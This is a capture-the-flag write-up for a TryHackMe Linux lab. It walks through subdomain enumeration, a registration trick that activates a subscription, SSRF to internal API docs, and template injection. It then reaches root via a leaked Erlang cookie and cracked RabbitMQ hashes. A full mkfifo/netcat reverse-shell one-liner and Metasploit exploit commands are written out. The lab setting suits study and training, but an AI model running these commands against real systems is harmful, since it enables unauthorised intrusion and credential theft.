
![[Capture d'écran 2025-03-01 124932.png]] 
Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

This machine is part of **TryHackMe** and is categorized as a **medium**-level Linux box. It offers a great learning opportunity by combining **web enumeration, SSRF exploitation and privilege escalation**. The challenge revolves around exploring a web application, uncovering misconfigurations, and leveraging them to gain root access. Let’s dive in!

---

### Recon

To start, we add the target's IP address to our `/etc/hosts` file and perform a full port scan using **nmap** :
```
nmap 10.10.9.16 -sV -sC -p- -oN nmapres
```

![[Capture d'écran 2025-03-01 130227.png]]

The scan reveals four open ports :

-  `22/tcp` : using `ssh` service
-  `80/tcp` : using `http` service. But we can see that we are redirected to `http://cloudsite.thm`
-  `4369/tcp` : using `empd` service
-  `25672/tcp` : using an `unknow` service

After adding `cloudsite.thm` to `/etc/hosts`, we continue enumeration using **Gobuster** :

```
gobuster dir -u cloudsite.thm  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusteres
```

![[Capture d'écran 2025-03-01 132436.png]]

This reveals two directories :

- `http://cloudsite.thm/assets/`
- `http://cloudiste.thm/jaavscript/`

We continue subdomain enumeration with **ffuf** :

```
ffuf -u http://cloudsite.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cloudsite.thm" -fw 18
```

![[Capture d'écran 2025-03-01 132958.png]]

This reveals a new subdomain: `storage.cloudsite.thm`. After updating `/etc/hosts`, we access the **Storage** website, where we can register an account.

---

### Initial foothold

We can now access to the website : 

![[Capture d'écran 2025-03-01 142346.png]]

From there we can **create** an account : 

![[Capture d'écran 2025-03-01 142648.png]]

Once logged in, we can see a message stating that an administrator must activate our account subscription :

![[Capture d'écran 2025-03-01 144531.png]]

To continue our enumeration, we use **Gobuster** on `/dashboard/` to discover directories : 

```
gobuster dir -u storage.cloudsite.thm/dashboard  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusteres
```

![[Capture d'écran 2025-03-01 152326.png]]

And we found three subdirectories : 
- active
- inactive
- Active

Using **Burp Suite** we can see the `Cookie` field with a `jwt` value.

![[Capture d'écran 2025-03-01 145354.png]]

So we can analyze the content of the `jwt` value by using `jwt.io`  :

![[Capture d'écran 2025-03-01 145629.png]]

As shown in the screen above, the cookie stores four elements : 

- `email` : "test@gmail[.]com"
- `subscription` : "inactive"
- `iat` : 1740835657
- `exp` : 1740839257

We might wonder what would happen if we modified the cookie to set the `subscription` field to `active`. However, since we don't have the **secret key**, we can't directly edit the payload. Instead, we can try adding this information to the `register` form.

![[Capture d'écran 2025-03-01 151928.png]]

We successfully created an new account with the `subscription` field set to `active`.

Once logged in, we can see that we have access to a new page `storage.cloudsite.thm/dashboard/activate` : 

![[Capture d'écran 2025-03-01 152051.png]]![[Capture d'écran 2025-03-01 154543.png]]

So we can try to get a **GET** request to our local machine to see if it works : 

![[Capture d'écran 2025-03-01 161653.png]]

![[Capture d'écran 2025-03-01 161715.png]]

As we can see, it's works and we can also see that we have a `/api/uploads` subdirectory. Let's make an enumeration with **gobuster** : 

```
gobuster dir -u storage.cloudsite.thm/api/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt > gobusteres4
```

![[Capture d'écran 2025-03-01 162551.png]]

We discovered several subdirectories, including `docs` (HTTP 403: Forbidden), which we can attempt to access through a **SSRF** (Server-Side Request Forgery) attack.

Using **Wappanalyzer** we can found that the server is using **Express** framework : 

![[Capture d'écran 2025-03-01 162813.png]]

Let's check if we can access these subdirectories by targeting port 3000, the default port for the Express framework.

![[Capture d'écran 2025-03-01 163618.png]]

Now, we can attempt to download the file to inspect its content : 

![[Capture d'écran 2025-03-01 163712.png]]

Now we have access to the documentation and we discovered different **endpoints** such as  `/api/fetch_messages_from_chatbot` which is a new one. Moreover, we can see a **Note** at the end that tells us that all requests need to be and sent in **JSON** format.

![[Capture d'écran 2025-03-01 164309.png]]

We can attempt to send a **POST** request to the endpoint, and the response indicates that a **username** parameter is required :

![[Capture d'écran 2025-03-01 170000.png]]

After testing various payloads, we discovered that the webpage is vulnerable to **SSTI (Server-Side Template Injection)**, specifically using the **Jinja2** template engine :

![[Capture d'écran 2025-03-01 181444.png]]

![[Capture d'écran 2025-03-01 182638.png]]

---
### Exploitation - Gaining shell access

Based on the response, we could attempt to establish a connection to our local machine : 

![[Capture d'écran 2025-03-01 171801.png]]

![[Capture d'écran 2025-03-01 172902.png]]

Now that we've confirmed the ability to inject code into the `username` parameter, we can attempt to obtain a **reverse shell** using [revshells.com](https://www.revshells.com/) : 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <port> >/tmp/f
```

![[Capture d'écran 2025-03-01 183502.png]]

![[Capture d'écran 2025-03-01 183901.png]]

And we get a reverse shell ! 

Now that we have access, we can retrieve the **user** flag : 

![[Capture d'écran 2025-03-01 183950.png]]

![[Capture d'écran 2025-03-01 230612.png]]

---
### Privilege escalation

While enumerating, we find an **Erlang Cookie** file at `/etc/bli/rabbitmq/.erlang.cookie`  :

![[Capture d'écran 2025-03-01 195642.png]]

We use **Metasploit** to exploit this for **Remote Code Execution (RCE)** :

```
use exploit/multi/misc/erlang_cookie_rce
set COOKIE <erlang_cookie>
set RHOSTS <target_ip>
set LHOST <local_ip>
set LPORT <local_port>
run
```

![[Capture d'écran 2025-03-01 201646.png]]

So now we can use  `rabbitmqctl` command but first, we need to edit the permission file of `.erlang.cookie` : 

![[Capture d'écran 2025-03-01 202558.png]]
![[Capture d'écran 2025-03-01 202756.png]]

We now have permission to list all RabbitMQ users :

![[Capture d'écran 2025-03-01 202939.png]]

We extract RabbitMQ **password hashes** using : 

```
rabbitmqctl export_definitions /tmp/rabbitmq.json
```

![[Capture d'écran 2025-03-01 203656.png]]

Then, we pretty-print the JSON file to locate the administrator’s password hash : 

```
python3 -m json.tool /tmp/rabbitmq.json
```

![[Capture d'écran 2025-03-01 230831.png]]
According to the RabbitMQ documentation, we can understand how the hash is constructed : 

> [!NOTE] [Rabbitmq](https://www.rabbitmq.com/docs/passwords#changing-algorithm):
> ### This is the algorithm:[​](https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm "Direct link to This is the algorithm:")
> - Generate a random 32 bit salt. In this example, we will use `908D C60A`. When RabbitMQ creates or updates a user, a random salt is generated.
> - Prepend the generated salt with the UTF-8 representation of the desired password. If the password is `test12`, at this step, the intermediate result would be `908D C60A 7465 7374 3132`
> - Take the hash (this example assumes the default [hashing function](https://www.rabbitmq.com/docs/passwords#changing-algorithm), SHA-256): `A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
> - Prepend the salt again: `908D C60A A5B9 24B3 096B 8897 D65A 3B5F 80FA 5DB62 A94 B831 22CD F4F8 FEAD 10D5 15D8 F391`
> - Convert the value to base64 encoding: `kI3GCqW5JLMJa4iX1lo7X4D6XbYqlLgxIs30+P6tENUV2POR`
> - Use the finaly base64-encoded value as the `password_hash` value in HTTP API requests and generated definition files

To retrieve the `SHA256` hash, we can run the following code : 

```
import base64
import binascii

# Base64-encoded RabbitMQ password hash 
rabbitmq_hash = <hash>  

# First we need to decode the Base64-encoded hash
decoded = base64.b64decode(rabbitmq_hash)

# Then extract the remaining bytes (SHA-256 hash) without the first 4 bytes (salt)
hash_value = decoded[4:]  

# Print the extracted SHA-256 hash in hexadecimal format
print(f"SHA-256 Hash : {binascii.hexlify(hash_value).decode()}")
```

By executing the code, we obtain the hash, which also serves as the `root` **password** :

![[Capture d'écran 2025-03-01 230936.png]]

--- 
### Root access 

We switch to the **root** user :

![[Capture d'écran 2025-03-01 220416.png]]

And retrieve the **root flag** :

![[Capture d'écran 2025-03-01 231404.png]]

---

**Congratulations!** I hope you found this writeup insightful. This CTF was an excellent challenge that emphasized the importance of **enumeration**, from uncovering subdomains and exploiting SSRF to leveraging RabbitMQ misconfigurations for privilege escalation. It showcased how persistence and creativity play a crucial role in penetration testing..

Thanks for reading, and happy hacking!

![[Capture d'écran 2025-03-01 221132.png]]